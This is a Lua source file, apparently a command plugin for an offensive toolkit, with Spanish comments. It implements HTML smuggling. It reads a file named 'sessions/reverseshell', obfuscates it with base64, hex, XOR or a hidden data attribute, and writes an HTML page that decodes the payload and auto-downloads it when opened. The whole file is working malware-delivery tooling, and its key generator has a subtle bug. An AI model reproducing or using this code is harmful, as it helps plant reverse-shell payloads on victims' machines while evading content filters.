function generate_html_payload()
    -- Obtener parámetros del usuario
    local file_path = "sessions/reverseshell"
    local method = "xor"

    if not file_path or not method then
        return "Error: file_path or method not defined."
    end

    -- Leer el archivo
    local file = io.open(file_path, "rb")
    if not file then
        return "Error: Could not open file at " .. file_path
    end

    local file_data = file:read("*all")
    file:close()

    -- Generar una clave aleatoria
    local function random_key(length)
        local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
        local key = {}
        for i = 1, length do
            table.insert(key, chars:sub(math.random(1, #chars), math.random(1, #chars)))
        end
        return table.concat(key)
    end

    local key = random_key(16)

    -- Funciones de codificación/cifrado
    local function encode_base64(data)
        return ngx.encode_base64(data)
    end

    local function decode_base64(data)
        return ngx.decode_base64(data)
    end

    local function encode_hex(data)
        return string.gsub(data, ".", function(c) return string.format("%02x", string.byte(c)) end)
    end

    local function xor_encrypt(data, key)
        local key_bytes = {string.byte(key, 1, #key)}
        local encrypted = {}
        for i = 1, #data do
            encrypted[i] = string.char(string.byte(data, i) ~ key_bytes[(i - 1) % #key_bytes + 1])
        end
        return table.concat(encrypted)
    end

    -- Aplicar el método seleccionado
    local encoded_data, decode_script
    if method == "base64" then
        encoded_data = encode_base64(file_data)
        decode_script = 'd=atob(d);'
    elseif method == "hex" then
        encoded_data = encode_hex(file_data)
        decode_script = 'd=decodeURIComponent(d.replace(/(..)/g,"%$1"));'
    elseif method == "xor" then
        local encrypted_data = xor_encrypt(file_data, key)
        encoded_data = encode_base64(encrypted_data)
        decode_script = string.format('d=(function(d,k){let r="";for(let i=0;i<d.length;i++)r+=String.fromCharCode(d.charCodeAt(i)^k.charCodeAt(i%%k.length));return r;})(atob(d),"%s");', key)
    elseif method == "css" then
        encoded_data = string.format('<div id="data" data-file="%s"></div>', encode_base64(file_data))
        decode_script = 'd=atob(document.getElementById("data").dataset.file);'
    else
        return "Error: Unsupported method."
    end

    -- Escapar caracteres especiales
    encoded_data = encoded_data:gsub("\\", "\\\\"):gsub("'", "\\'"):gsub('"', '\\"')

    -- Plantilla del archivo HTML generado
    local html_payload = string.format([[
<!DOCTYPE html>
<html>
<body>
%s
<script>
(async () => {
    let d = "%s";
    %s
    const l = document.createElement('a');
    l.href = `data:application/octet-stream;base64,${btoa(d)}`;
    l.download = "%s";
    document.body.appendChild(l);
    l.click();
    l.remove();
})();
</script>
</body>
</html>
]], method == "css" and encoded_data or "", encoded_data, decode_script, file_path:match("([^/\\]+)$"))

    -- Guardar el archivo HTML generado
    local output_file = string.format("smugglo_%s.html", file_path:match("([^/\\]+)$"))
    local output = io.open(output_file, "w")
    if not output then
        return "Error: Could not create file at " .. output_file
    end

    output:write(html_payload)
    output:close()

    return "HTML payload generated successfully. File saved at " .. output_file
end

-- Registrar el comando
register_command("generate_html_payload", generate_html_payload)